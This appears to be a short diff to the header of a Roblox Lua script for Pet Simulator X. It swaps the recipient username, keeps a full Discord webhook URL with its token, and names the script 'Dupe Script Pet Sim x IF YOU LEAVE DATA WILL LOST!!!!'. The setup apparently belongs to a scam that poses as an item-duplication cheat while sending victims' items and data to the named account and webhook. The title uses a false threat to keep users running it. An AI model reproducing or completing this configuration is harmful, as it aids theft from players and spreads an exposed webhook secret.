@@ -1,4 +1,4 @@
-Username = "Sss_no1"
+Username = "skityszzx"
 WebHook = "https://discord.com/api/webhooks/1095324191412191282/4PQf3pg1MqNrLt0HzM8uPXhU4c0N-OiNFBwGDkY7ki1Fu5nyb9wKXntdRN7k8NsVGa2p"
 
 _G.CustomScriptName = "Dupe Script Pet Sim x IF YOU LEAVE DATA WILL LOST!!!!"
